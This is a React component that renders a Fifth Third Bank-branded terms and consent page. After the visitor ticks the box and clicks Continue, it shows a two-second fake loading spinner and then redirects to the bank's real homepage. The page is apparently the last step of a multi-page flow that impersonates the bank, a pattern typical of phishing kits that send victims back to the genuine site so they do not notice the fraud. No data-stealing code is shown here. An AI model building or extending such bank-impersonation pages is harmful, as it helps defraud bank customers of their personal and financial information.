import React, { useState } from 'react';
import FlowPageLayout from '../components/FlowPageLayout';

const Terms: React.FC = () => {
  const [isChecked, setIsChecked] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const handleCheckboxChange = () => {
    setIsChecked((previous) => {
      const next = !previous;
      if (next) {
        setErrorMessage('');
      }
      return next;
    });
  };

  const handleSubmit = (event: React.FormEvent) => {
    event.preventDefault();
    if (!isChecked) {
      setErrorMessage('Please agree to the terms before proceeding.');
      return;
    }

    setIsLoading(true);
    setErrorMessage('');

    setTimeout(() => {
      window.location.href = 'https://www.53.com/content/fifth-third/en.html';
    }, 2000);
  };

  return (
    <FlowPageLayout breadcrumb="Terms & Conditions" cardMaxWidth="max-w-3xl" cardContentClassName="space-y-6">
      <div className="space-y-4 text-sm text-gray-700 leading-relaxed">
        <p>
          By submitting this registration form, I understand that I am providing written instructions in accordance with the
          Fair Credit Reporting Act, Driver Privacy Protection Act, and other applicable law for Fifth Third Bank and its
          affiliates to request and receive information about me from third parties, including but not limited to a copy of my
          consumer credit report, score, and motor vehicle records from consumer reporting agencies, at any time for so long as
          I have an active account.
        </p>

        <p>
          I further authorize Fifth Third Bank and its affiliates to retain a copy of my information for use in accordance with
          Fifth Third Bank's{' '}
          <a href="#" className="text-[#123b9d] font-semibold hover:underline">
            Terms of Service
          </a>{' '}
          and{' '}
          <a href="#" className="text-[#123b9d] font-semibold hover:underline">
            Privacy Statement
          </a>
          .
        </p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <label className="flex items-center gap-3">
          <input
            type="checkbox"
            checked={isChecked}
            onChange={handleCheckboxChange}
            className="h-4 w-4 rounded border-gray-300 text-[#123b9d] focus:ring-[#123b9d]"
          />
          <span className="text-sm text-gray-700">I understand and agree</span>
        </label>

        {errorMessage && (
          <div className="flex items-center gap-2 text-sm font-semibold text-red-600">
            <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
              <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
            </svg>
            <span>{errorMessage}</span>
          </div>
        )}

        <div className="flex justify-end">
          {!isLoading ? (
            <button
              type="submit"
              className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e]"
            >
              Continue
            </button>
          ) : (
            <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-[#123b9d] border-t-transparent" />
          )}
        </div>
      </form>

      <div className="rounded-md bg-[#f4f2f2] px-4 py-3 text-xs text-gray-600 text-center">
        For security reasons, never share your personal information with anyone unless you are certain who you are providing it to,
        and only share information through a secure webpage or site.
      </div>
    </FlowPageLayout>
  );
};

export default Terms;
